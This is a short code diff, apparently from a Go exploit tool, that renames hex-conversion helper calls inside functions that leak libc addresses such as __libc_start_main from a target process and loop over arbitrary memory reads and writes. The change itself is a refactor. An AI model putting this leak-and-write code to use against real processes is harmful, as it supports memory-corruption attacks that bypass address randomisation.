@@ -73,7 +73,7 @@ func leakParams(proc *process.Process) {
 	//__libc_start_main+234 - 0x7fa0bed99d0a - 45
 	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
 	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)
-	__libc_start_main234 := pm.HexBytesOrExit(leaker.MemoryAtParamOrExit(45), binary.BigEndian)
+	__libc_start_main234 := pm.FromHexBytesOrExit(leaker.MemoryAtParamOrExit(45), binary.BigEndian)
 
 	log.Printf("_IO_2_1_stderr_: %s | _IO_file_jumps %s | __libc_start_main 0x%x",
 		_IO_2_1_stderr_, _IO_file_jumps, __libc_start_main234.Uint()-234)
@@ -136,7 +136,7 @@ func leakMemoryAtLoop(proc *process.Process) {
 			log.Fatalln(err)
 		}
 
-		pointer, convErr := pm.HexString(pointerStr, binary.BigEndian)
+		pointer, convErr := pm.FromHexString(pointerStr, binary.BigEndian)
 		if convErr != nil {
 			log.Printf("failed to convert pointer string - %s", err)
 			continue
@@ -186,7 +186,7 @@ func writeMemoryLoop(proc *process.Process) {
 			continue
 		}
 
-		pointer, convErr := pm.HexString(parts[0], binary.BigEndian)
+		pointer, convErr := pm.FromHexString(parts[0], binary.BigEndian)
 		if convErr != nil {
 			log.Printf("failed to convert pointer string - %s", convErr)
 			continue
